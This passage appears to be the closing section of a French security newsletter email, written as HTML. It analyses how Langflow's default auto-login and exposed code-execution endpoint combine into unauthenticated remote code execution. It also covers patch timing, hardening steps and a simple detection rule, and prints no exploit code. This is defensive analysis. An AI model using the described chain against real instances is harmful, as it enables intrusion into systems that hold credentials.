+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Condition commune</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">LANGFLOW_AUTO_LOGIN=true par d&eacute;faut</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">auto_login non authentifi&eacute; et non lie &agrave; la loopback</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">La m&ecirc;me decision de conception porte les deux</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Les deux bulletins sont publi&eacute;s s&eacute;par&eacute;ment et ne se citent pas l'un l'autre. Lus ensemble, ils d&eacute;crivent une cause unique traitee deux fois par ses effets.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le jugement technique tient en peu de mots. Il n'y a rien de neuf dans cette cha&icirc;ne : aucun 0-day, aucune primitive int&eacute;ressante, aucun travail d'exploitation. Les deux endpoints sont utilises exactement comme ils ont &eacute;t&eacute; &eacute;crits, avec les verbes HTTP pr&eacute;vus et des corps de requ&ecirc;te bien formes. La seule comp&eacute;tence requise apr&egrave;s le 21 juillet consiste &agrave; trouver une instance expos&eacute;e, ce que la disponibilit&eacute; d'un template Nuclei le 29 juillet a rendu gratuit. C'est une vuln&eacute;rabilit&eacute; de posture, pas de code.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le maillon faible est identifiable sans ambigu&iuml;t&eacute;, et ce n'est ni <code>exec()</code> ni <code>__builtins__</code> : c'est <code>LANGFLOW_AUTO_LOGIN=true</code> comme valeur par d&eacute;faut. Une commodit&eacute; de d&eacute;veloppement local &mdash; d&eacute;marrer sans cr&eacute;er de compte &mdash; a &eacute;t&eacute; livr&eacute;e dans la configuration par d&eacute;faut d'un produit qui, dans le m&ecirc;me mouvement, &eacute;coute sur <code>0.0.0.0</code> et se retrouve derri&egrave;re un ingress. Les deux CVE en d&eacute;coulent. Le durcissement pertinent est donc ant&eacute;rieur aux deux : lier les endpoints d'administration &agrave; la loopback, exiger une authentification avant l'emission de tout jeton, et placer l'instance derri&egrave;re un reverse proxy authentifiant.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  L'etape ou la cha&icirc;ne aurait du &ecirc;tre cass&eacute;e est le 21 juin. Un correctif qui r&eacute;pare une &eacute;vasion de sandbox sans se demander qui peut atteindre le sandbox traite un sympt&ocirc;me. La question &agrave; poser en 1.9.4 n'&eacute;tait pas <em>comment empecher ce code de s'echapper</em> mais <em>pourquoi un appelant non authentifi&eacute; peut-il soumettre du code</em>. Onze jours de d&eacute;calage entre les deux bulletins sugg&egrave;rent que la question a bien fini par &ecirc;tre posee, mais apr&egrave;s la publication du premier correctif plutot qu'avant.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  C&ocirc;t&eacute; t&eacute;l&eacute;m&eacute;trie, la particularit&eacute; de ce cas est qu'il n'y avait rien de subtil &agrave; d&eacute;tecter. Les deux endpoints sont nommes, documentes, et figurent dans les recommandations de surveillance publi&eacute;es depuis. Un appel &agrave; <code>/api/v1/auto_login</code> provenant d'une adresse non locale est, par d&eacute;finition m&ecirc;me du bug, un &eacute;v&eacute;nement anormal : l'endpoint n'a de sens que depuis la loopback. Il n'existe pas de faux positif int&eacute;ressant sur cette r&egrave;gle. La d&eacute;tection ne demandait donc ni EDR, ni corr&eacute;lation, ni mod&egrave;le &mdash; seulement un journal d'acces HTTP relu une fois.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 20px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f7ecd6; border:2px dashed #8a5a12;">
+  <tr>
+    <td style="padding:12px 16px 6px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:1.5px; text-transform:uppercase; font-weight:700; color:#6b4409;">&#9888;&#65039; Hypoth&egrave;se non test&eacute;e</td>
+  </tr>
+  <tr>
+    <td style="padding:0 16px 14px 16px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#3b2c11;">Deux limites d'inf&eacute;rence &agrave; poser clairement. <strong>Premi&egrave;rement, aucune source publique ne distingue le balayage de la compromission.</strong> Les 746 tentatives de KEVintel sont des d&eacute;clenchements de sonde ; l'inscription au KEV atteste d'une exploitation constat&eacute;e mais la CISA ne nomme ni acteur ni campagne, IBM non plus, et Field Effect note explicitement l'absence de d&eacute;tails sur les campagnes observ&eacute;es. Le rayon d'impact r&eacute;el de cet &eacute;pisode est donc inconnu, et tout chiffre de victimes serait invente. <strong>Deuxi&egrave;mement, le lien de causalit&eacute; entre le correctif 1.9.4 et l'exposition de CVE-2026-9198 est notre lecture de deux bulletins qui ne se citent pas.</strong> IBM ne presente nulle part le second comme une cons&eacute;quence du p&eacute;rim&egrave;tre du premier. La chronologie et les descriptions le rendent difficile &agrave; lire autrement, mais c'est une d&eacute;duction, pas une d&eacute;claration du fournisseur.</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Reste ce que cet &eacute;pisode dit du reste. Les plateformes d'orchestration LLM h&eacute;ritent d'un mod&egrave;le de menace qu'elles n'ont pas con&ccedil;u : elles concentrent les identifiants de tous les syst&egrave;mes qu'elles relient, et beaucoup ont &eacute;t&eacute; &eacute;crites avec des d&eacute;fauts de confort pens&eacute;es pour un poste de d&eacute;veloppement. Le motif &mdash; <em>auto-login active par d&eacute;faut, ex&eacute;cution de code expos&eacute;e, &eacute;coute sur toutes les interfaces</em> &mdash; n'a rien de sp&eacute;cifique &agrave; Langflow. C'est le premier endroit ou regarder sur les instances &eacute;quivalentes du m&ecirc;me SI, et cela ne demande pas d'attendre le prochain CVE.
+</td>
+</tr>
+<tr>
+<td style="padding:8px 30px 30px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f1efea; border:1px solid #dcd8d0;">
+  <tr><td style="padding:12px 16px 8px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700; border-bottom:1px solid #dcd8d0;">Sources &mdash; partie 04</td></tr>
+  <tr>
+    <td style="padding:12px 16px 14px 16px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; font-family:Consolas,'SF Mono',Menlo,monospace;">
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[17]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-07-02</span> &nbsp;&middot;&nbsp; IBM &mdash; <a href="https://www.ibm.com/support/pages/node/7278927" style="color:#2f5474;">Security Bulletin: Unauthenticated Remote Code Execution via Auto-Login Bypass and Code Validation (CVE-2026-9198)</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[18]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-06-21</span> &nbsp;&middot;&nbsp; IBM &mdash; <a href="https://www.ibm.com/support/pages/security-bulletin-unauthenticated-remote-code-execution-langflow-oss-pythonreplcomponent-builtins-injection" style="color:#2f5474;">Security Bulletin: Unauthenticated RCE in Langflow OSS PythonREPLComponent via Builtins Injection (CVE-2026-10561)</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[19]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-04</span> &nbsp;&middot;&nbsp; CISA &mdash; <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" style="color:#2f5474;">KEV - IBM Langflow Code Injection Vulnerability, echeance BOD 26-04 au 2026-08-07</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[20]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; KEVintel &mdash; <a href="https://kevintel.com/CVE-2026-9198" style="color:#2f5474;">CVE-2026-9198 - chronologie et telemetrie d'exploitation</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[21]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-05</span> &nbsp;&middot;&nbsp; Field Effect &mdash; <a href="https://fieldeffect.com/blog/langflow-vulnerability-chain-active-exploitation" style="color:#2f5474;">Langflow vulnerability chain under active exploitation</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700;">[22]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-05</span> &nbsp;&middot;&nbsp; Indusface &mdash; <a href="https://www.indusface.com/blog/cve-2026-9198-langflow-rce/" style="color:#2f5474;">CVE-2026-9198: Critical Langflow RCE Under Active Exploitation</a></td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:22px 30px 26px 30px; background-color:#1e1d1b; border-top:3px solid #7a4a2e;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr><td style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:19px; color:#b5b0a7; padding-bottom:4px;">G&eacute;n&eacute;r&eacute; le 2026-08-12 &agrave; 01:58 UTC &nbsp;&middot;&nbsp; pipeline v1.0</td></tr>
+  <tr><td style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:19px; color:#b5b0a7; padding-bottom:4px;">Fen&ecirc;tre couverte&nbsp;: 2026-08-05 06:00 &rarr; 2026-08-12 06:00 UTC &nbsp;&middot;&nbsp; 73 sources scann&eacute;es, 22 retenues</td></tr>
+  <tr><td style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:19px; padding-bottom:10px;"><a href="https://rzdhop.github.io/Newsletter" style="color:#c9b79a; text-decoration:underline;">rzdhop.github.io/Newsletter</a> &nbsp;&middot;&nbsp; <span style="color:#8f8b82;">&eacute;ditions n&deg;1 &agrave; 419</span></td></tr>
+  <tr><td style="border-top:1px solid #3a3733; padding-top:10px; padding-bottom:8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Fond clair assum&eacute;&nbsp;: aucune variante sombre n&rsquo;est fournie. Diffusion&nbsp;: 2 destinataire(s).</td></tr>
+  <tr><td style="border-top:1px solid #3a3733; padding-top:8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#8f8b82;">Bulletin d&rsquo;analyse technique en s&eacute;curit&eacute; offensive. Chaque sujet porte sur des travaux publics et cit&eacute;s&nbsp;: le bulletin commente la recherche existante et n&rsquo;en produit pas. Destin&eacute; &agrave; un lectorat professionnel, pour usage en laboratoire ou dans le cadre d&rsquo;engagements autoris&eacute;s.</td></tr>
+  </table>
+</td>
+</tr>
+
+</table>
+</td>
+</tr>
+</table>
+
+</body>
+</html>
